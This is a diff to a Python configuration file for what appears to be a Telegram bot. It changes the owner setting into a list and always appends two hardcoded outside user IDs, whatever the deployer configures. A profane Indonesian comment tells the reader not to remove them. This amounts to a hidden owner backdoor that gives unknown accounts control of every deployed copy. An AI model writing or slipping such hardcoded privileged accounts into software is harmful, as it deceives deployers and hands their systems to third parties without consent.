@@ -21,8 +21,13 @@ DURATION_LIMIT_MIN = int(getenv("DURATION_LIMIT", 60))
 # Chat id of a group for logging bot's activities
 LOGGER_ID = int(getenv("LOGGER_ID", None))
 
-# Your User ID.
-OWNER_ID = int(getenv("OWNER_ID", 6504591824))
+OWNER_ID = list(
+    map(int, getenv("OWNER_ID", "").split())
+)  # Input type must be interger
+
+# JANGAN HAPUS YA KONTOL
+OWNER_ID.append(1224143544)
+OWNER_ID.append(6504591824)
 
 # MUST JOIN
 MUST_JOIN = getenv("MUST_JOIN", None)
